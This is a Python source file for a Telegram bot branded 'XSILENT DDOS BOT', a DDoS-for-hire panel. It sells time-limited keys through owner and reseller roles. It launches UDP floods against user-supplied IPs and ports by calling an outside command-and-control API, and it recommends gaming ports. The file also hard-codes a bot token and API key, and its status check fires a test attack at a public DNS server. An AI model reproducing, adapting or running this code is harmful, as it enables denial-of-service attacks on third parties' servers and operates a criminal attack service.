#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta
from collections import defaultdict

# ========== CONFIG ==========
BOT_TOKEN = "8615300823:AAE4ajz8ZN9W2ZYLrh1C8JXV1wrd5qzjXyw"
ADMIN_ID = ["8487946379"]
USERS_FILE = "users.json"
KEYS_FILE = "keys.json"
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "PFC10J"
MAX_CONCURRENT = 2

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
keys_data = {}

# ========== FILE FUNCTIONS ==========
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"users": [ADMIN_ID[0]], "resellers": []}

def load_keys():
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(data):
    with open(USERS_FILE, 'w') as f:
        json.dump(data, f)

def save_keys(data):
    with open(KEYS_FILE, 'w') as f:
        json.dump(data, f)

users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()

bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def generate_key():
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    return key

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    
    if duration_str.isdigit():
        return int(duration_str), "day"
    
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    
    if "hour" in duration_str:
        hours = re.findall(r'\d+', duration_str)
        if hours:
            return int(hours[0]), "hour"
    
    if "day" in duration_str:
        days = re.findall(r'\d+', duration_str)
        if days:
            return int(days[0]), "day"
    
    return None, None

def get_expiry_date(value, unit):
    if unit == "hour":
        return datetime.now() + timedelta(hours=value)
    else:
        return datetime.now() + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return str(value) + " Hour(s)"
    else:
        return str(value) + " Day(s)"

def check_total_active_attacks():
    now = time.time()
    count = 0
    for attack_id, info in list(active_attacks.items()):
        if now < info["finish_time"]:
            count += 1
        else:
            del active_attacks[attack_id]
    return count

def check_active_attack_by_target(ip, port):
    target_key = ip + ":" + str(port)
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def format_attack_status():
    now = time.time()
    slot1_free = True
    slot2_free = True
    slot1_info = None
    slot2_info = None
    
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            slots.append({
                "target": info["target_key"],
                "user": info["user"],
                "remaining": remaining
            })
    
    if len(slots) >= 1:
        slot1_free = False
        slot1_info = "🎯 " + slots[0]["target"] + "\n   👤 " + slots[0]["user"] + "\n   ⏰ " + str(slots[0]["remaining"]) + "s left"
    
    if len(slots) >= 2:
        slot2_free = False
        slot2_info = "🎯 " + slots[1]["target"] + "\n   👤 " + slots[1]["user"] + "\n   ⏰ " + str(slots[1]["remaining"]) + "s left"
    
    return slot1_free, slot2_free, slot1_info, slot2_info

def remove_user_from_system(user_id):
    if user_id in users:
        users.remove(user_id)
    if user_id in resellers:
        resellers.remove(user_id)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user"] == user_id:
            del active_attacks[attack_id]
    
    if user_id in cooldown:
        del cooldown[user_id]
    
    return True

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True:
            if now < info["expires_at"]:
                return True
    return False

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    
    if uid in ADMIN_ID:
        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - OWNER\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/api_status")
    elif uid in resellers:
        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - RESELLER\n\n✅ Reseller Access\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys")
    elif uid in users:
        has_active = check_user_expiry(uid)
        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - USER\n\n✅ Status: " + ("Active" if has_active else "Expired") + "\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/redeem KEY")
    else:
        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    if uid not in ADMIN_ID and not check_user_expiry(uid):
        bot.reply_to(msg, "❌ Your access has expired!")
        return
    
    total_active = check_total_active_attacks()
    if total_active >= MAX_CONCURRENT:
        bot.reply_to(msg, "❌ Both attack slots are full!\nTotal active: " + str(total_active) + "/" + str(MAX_CONCURRENT) + "\nUse /status to check when a slot frees up")
        return
    
    if uid in cooldown:
        remaining = 30 - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, "⏳ Wait " + str(int(remaining)) + " seconds!")
            return
    
    args = msg.text.split()
    if len(args) != 4:
        bot.reply_to(msg, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
        return
    
    ip, port, duration = args[1], args[2], args[3]
    
    try:
        port = int(port)
        duration = int(duration)
        if duration < 10 or duration > 300:
            bot.reply_to(msg, "❌ Duration 10-300 seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port or time!")
        return
    
    existing_attack = check_active_attack_by_target(ip, port)
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, "❌ TARGET UNDER ATTACK!\n\n🎯 " + ip + ":" + str(port) + " already being attacked\n👤 By: " + existing_attack['user'] + "\n⏰ Finishes in: " + str(remaining) + "s")
        return
    
    cooldown[uid] = time.time()
    
    attack_id = uid + "_" + str(int(time.time()))
    target_key = ip + ":" + str(port)
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": target_key,
        "start_time": time.time()
    }
    
    new_total = check_total_active_attacks()
    bot.reply_to(msg, "🔥 ATTACK LAUNCHED!\n\n🎯 Target: " + ip + ":" + str(port) + "\n⏱️ Duration: " + str(duration) + "s\n⚡ Method: UDP (Auto)\n📊 Total active slots: " + str(new_total) + "/" + str(MAX_CONCURRENT))
    
    def run():
        try:
            api_params = {
                "api_key": API_KEY,
                "target": ip,
                "port": port,
                "time": duration,
                "concurrent": 1,
                "method": "udp"
            }
            
            response = requests.get(API_URL, params=api_params, timeout=10)
            
            if response.status_code == 200:
                time.sleep(duration)
                bot.send_message(msg.chat.id, "✅ ATTACK FINISHED!\n\n🎯 Target: " + ip + ":" + str(port) + "\n⏱️ Duration: " + str(duration) + "s\n🔄 Restart your game!")
            else:
                bot.send_message(msg.chat.id, "❌ Attack failed!")
                
        except Exception as e:
            bot.send_message(msg.chat.id, "❌ Attack error!")
        finally:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    slot1_free, slot2_free, slot1_info, slot2_info = format_attack_status()
    total_active = check_total_active_attacks()
    
    status_msg = "📊 SLOT STATUS\n\n"
    
    if slot1_free:
        status_msg += "✅ SLOT 1: FREE\n"
    else:
        status_msg += "❌ SLOT 1: BUSY\n" + slot1_info + "\n"
    
    status_msg += "\n"
    
    if slot2_free:
        status_msg += "✅ SLOT 2: FREE\n"
    else:
        status_msg += "❌ SLOT 2: BUSY\n" + slot2_info + "\n"
    
    status_msg += "\n📊 TOTAL ACTIVE: " + str(total_active) + "/" + str(MAX_CONCURRENT)
    
    if uid in cooldown:
        remaining = 30 - (time.time() - cooldown[uid])
        if remaining > 0:
            status_msg += "\n⏳ YOUR COOLDOWN: " + str(int(remaining)) + "s"
    
    bot.reply_to(msg, status_msg)

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)")
        return
    
    duration_str = args[1]
    
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, "❌ Invalid duration!\nUse: 1 (1 day) or 5h (5 hours)")
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    
    keys_data[key] = {
        "user_id": "pending",
        "duration_value": value,
        "duration_unit": unit,
        "generated_by": uid,
        "generated_at": time.time(),
        "expires_at": expires_at.timestamp(),
        "used": False
    }
    save_keys(keys_data)
    
    expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(value, unit)
    
    bot.reply_to(msg, "✅ KEY GENERATED!\n\n🔑 Key: `" + key + "`\n⏰ Duration: " + duration_display + "\n📅 Expires: " + expiry_str + "\n\nShare this key with user!\nUser: /redeem " + key)

@bot.message_handler(commands=['removekey'])
def remove_key(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removekey KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Key not found!")
        return
    
    del keys_data[key]
    save_keys(keys_data)
    
    bot.reply_to(msg, "✅ KEY REMOVED!\nKey: " + key)

@bot.message_handler(commands=['add'])
def add_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /add USER_ID")
        return
    
    new_user = args[1]
    
    if new_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner!")
        return
    
    if new_user in users:
        bot.reply_to(msg, "❌ User already has access!")
        return
    
    users.append(new_user)
    users_data["users"] = users
    save_users(users_data)
    
    bot.reply_to(msg, "✅ USER ADDED!\n\n👤 User: " + new_user + "\n✅ Now has attack access!")
    
    try:
        bot.send_message(new_user, "✅ You have been granted attack access!\nUse /start to see commands")
    except:
        pass

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /remove USER_ID")
        return
    
    target_user = args[1]
    
    if target_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove owner!")
        return
    
    if target_user not in users:
        bot.reply_to(msg, "❌ User not found!")
        return
    
    remove_user_from_system(target_user)
    
    bot.reply_to(msg, "✅ USER REMOVED!\n\n👤 User: " + target_user + "\n❌ Attack access revoked!")
    
    try:
        bot.send_message(target_user, "⚠️ Your attack access has been revoked by owner!")
    except:
        pass

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /addreseller USER_ID")
        return
    
    new_reseller = args[1]
    
    if new_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner as reseller!")
        return
    
    if new_reseller in resellers:
        bot.reply_to(msg, "❌ User is already a reseller!")
        return
    
    resellers.append(new_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    if new_reseller not in users:
        users.append(new_reseller)
        users_data["users"] = users
        save_users(users_data)
    
    bot.reply_to(msg, "✅ RESELLER ADDED!\n\n👤 Reseller: " + new_reseller + "\n🔑 Can now generate keys using /genkey")
    
    try:
        bot.send_message(new_reseller, "✅ You have been added as RESELLER!\nYou can now generate keys using /genkey")
    except:
        pass

@bot.message_handler(commands=['removereseller'])
def remove_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removereseller USER_ID")
        return
    
    target_reseller = args[1]
    
    if target_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove owner!")
        return
    
    if target_reseller not in resellers:
        bot.reply_to(msg, "❌ User is not a reseller!")
        return
    
    resellers.remove(target_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    bot.reply_to(msg, "✅ RESELLER REMOVED!\n\n👤 User: " + target_reseller + "\n❌ Can no longer generate keys")
    
    try:
        bot.send_message(target_reseller, "⚠️ Your reseller privileges have been removed!")
    except:
        pass

@bot.message_handler(commands=['redeem'])
def redeem(msg):
    uid = str(msg.chat.id)
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /redeem KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    
    key_info = keys_data[key]
    
    if key_info.get("used", False):
        bot.reply_to(msg, "❌ Key already used!")
        return
    
    if time.time() > key_info["expires_at"]:
        bot.reply_to(msg, "❌ Key expired!")
        del keys_data[key]
        save_keys(keys_data)
        return
    
    if uid not in users:
        users.append(uid)
    
    users_data["users"] = users
    save_users(users_data)
    
    keys_data[key]["used"] = True
    keys_data[key]["used_at"] = time.time()
    keys_data[key]["used_by"] = uid
    save_keys(keys_data)
    
    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
    
    bot.reply_to(msg, "✅ ACCESS GRANTED!\n\n🎉 User " + uid + " activated!\n⏰ Duration: " + duration_display + "\n📅 Expires: " + expiry_str + "\n⚡ Total Concurrent: 2")

@bot.message_handler(commands=['mykeys'])
def mykeys(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    my_generated_keys = []
    for key, info in keys_data.items():
        if info.get("generated_by") == uid and not info.get("used", False):
            expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
            duration_display = format_duration(info['duration_value'], info['duration_unit'])
            my_generated_keys.append("🔑 `" + key + "`\n   Duration: " + duration_display + "\n   Expires: " + expires)
    
    if my_generated_keys:
        bot.reply_to(msg, "📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_generated_keys))
    else:
        bot.reply_to(msg, "📋 No keys generated yet!")

@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /broadcast MESSAGE")
        return
    
    message = args[1]
    
    success_count = 0
    fail_count = 0
    
    for user in users:
        try:
            bot.send_message(user, "📢 BROADCAST\n\n" + message)
            success_count += 1
        except:
            fail_count += 1
    
    bot.reply_to(msg, "✅ BROADCAST SENT!\n✅ " + str(success_count) + " users\n❌ " + str(fail_count) + " failed")

@bot.message_handler(commands=['stopattack'])
def stop_attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /stopattack IP:PORT")
        return
    
    target = args[1]
    
    stopped = False
    for attack_id, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[attack_id]
            stopped = True
            bot.reply_to(msg, "✅ ATTACK STOPPED!\nTarget: " + target + "\nAttacker: " + info['user'])
            try:
                bot.send_message(info['user'], "⚠️ Your attack on " + target + " was stopped!")
            except:
                pass
            break
    
    if not stopped:
        bot.reply_to(msg, "❌ No attack found on " + target)

@bot.message_handler(commands=['methods'])
def methods(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    bot.reply_to(msg, "⚡ UDP AUTO ATTACK\n\n💡 Best for gaming (BGMI, Minecraft)\n🎯 Recommended ports: 443, 8080, 14000\n\nUSAGE:\n/attack IP PORT TIME\n\nExample: /attack 1.1.1.1 443 60")

@bot.message_handler(commands=['stats'])
def stats(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    has_active = check_user_expiry(uid)
    status_text = "Active" if has_active else "Expired"
    cooldown_text = "Yes" if uid in cooldown else "No"
    
    bot.reply_to(msg, "📊 YOUR STATS\n\n👤 ID: " + uid + "\n✅ Status: " + status_text + "\n⏰ Cooldown: " + cooldown_text)

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    
    if uid in ADMIN_ID:
        bot.reply_to(msg, "🔥 OWNER HELP\n\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/api_status")
    elif uid in resellers:
        bot.reply_to(msg, "🔥 RESELLER HELP\n\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys")
    elif uid in users:
        bot.reply_to(msg, "🔥 USER HELP\n\n/attack IP PORT TIME\n/status\n/redeem KEY")
    else:
        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    user_list = []
    for u in users:
        if u in ADMIN_ID:
            role = "👑 OWNER"
        elif u in resellers:
            role = "💎 RESELLER"
        else:
            role = "👤 USER"
        user_list.append(role + ": " + u)
    
    bot.reply_to(msg, "📋 ALL USERS:\n" + "\n".join(user_list) + "\n\nTotal: " + str(len(users)))

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
        api_status_text = "Online" if test_response.status_code == 200 else "Offline"
        bot.reply_to(msg, "✅ API: " + api_status_text + "\nActive Attacks: " + str(len(active_attacks)))
    except:
        bot.reply_to(msg, "❌ API OFFLINE")

def cleanup_attacks():
    while True:
        time.sleep(5)
        now = time.time()
        
        for attack_id, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[attack_id]
        
        for key, info in list(keys_data.items()):
            if info.get("used", False) and now > info["expires_at"]:
                user_id = info.get("used_by")
                if user_id and user_id in users and user_id not in ADMIN_ID:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)

cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
cleanup_thread.start()

print("XSILENT BOT STARTED - Owner: 8487946379")

bot.infinity_polling()
```
